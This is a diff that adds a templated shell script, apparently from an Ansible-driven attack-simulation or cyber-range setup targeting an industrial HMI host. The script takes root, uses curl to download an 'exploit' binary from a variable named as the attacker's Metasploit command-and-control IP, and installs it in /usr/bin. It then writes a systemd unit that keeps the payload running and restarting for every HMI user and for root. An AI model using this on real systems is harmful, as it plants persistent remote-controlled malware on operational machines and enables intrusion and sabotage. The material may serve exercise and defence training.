@@ -1,0 +1,22 @@
+sudo -i
+systemctl stop {{ exploit_filename }}.service
+rm /usr/bin/{{ exploit_filename }}
+curl http://{{ attacker_cc_metasploit_ip_lanturtle }}/{{ exploit_filename }} --output /usr/bin/{{ exploit_filename }}
+chmod +x /usr/bin/{{ exploit_filename }}
+echo "[Unit]
+Description={{ exploit_filename }} Starter 
+
+[Service]
+Restart=always
+RestartSec=30s
+ExecStart=/usr/bin/{{ exploit_filename }}
+User=%I
+
+[Install]
+WantedBy=multi-user.target" | tee /etc/systemd/system/{{ exploit_filename }}@.service
+systemctl daemon-reload
+{% for hmiuser in (hostvars[company_name + '_hmi'].host_user_list + [hostvars[company_name + '_hmi'].client_user]) | map(attribute='username') + ['root'] %}
+systemctl enable {{ exploit_filename }}@{{hmiuser}}.service 
+systemctl start {{ exploit_filename }}@{{hmiuser}}.service
+{% endfor %}
+exit
